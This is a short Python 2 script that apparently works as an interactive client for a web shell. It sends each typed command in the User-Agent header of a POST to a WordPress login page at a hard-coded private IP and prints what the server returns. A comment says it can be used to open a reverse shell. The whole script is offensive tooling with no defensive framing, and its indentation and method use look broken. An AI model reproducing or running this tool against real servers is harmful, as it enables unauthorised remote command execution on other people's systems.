#coding:utf-8

import os
import re
import sys
import requests
import readline

class ExecutionCommand:
    def __init__(self, url_target="http://10.1.1.38/blog/wp-login.php", 
                    send_users_texts=None):

        '''
            So concretely this
            function corresponds precisely to the options and
            the necessary parameters __str__().
        '''

        self.url_target = url_target
        self.send_users_texts = send_users_texts

    def __str__(self, execution_command):
        '''
            This function sends the attack to the
            server and the commands entered __init__()
        '''
        new_requests_method = requests.session()
        send_users_agent = {"User-Agent":execution_command}

        # The dream sent to the http server and the user-agent.
        # We can then do a reverse shell with the commands entered.

        self.send_users_texts = new_requests_method.post(self.url_target, headers=send_users_agent).text
        self.send_users_texts = self.send_users_texts.split("<!DOCTYPE html>")[0]

        if(isinstance(self.send_users_texts, unicode) == True):
            print self.send_users_texts

    def send_command(self):
        '''
            The function __str __ () is
            called here.
        '''
        while True:
            execution_command = raw_input('\033[42m[contra_cmd]$> \033[0m ')
            if execution_command != ""     : print self.__str__(execution_command)
            if execution_command == "exit" : sys.exit(0)
            if execution_command == ""     : continue

if __name__ == "__main__":
	algorithm_call = ExecutionCommand()
  algorithm_call.send_command()
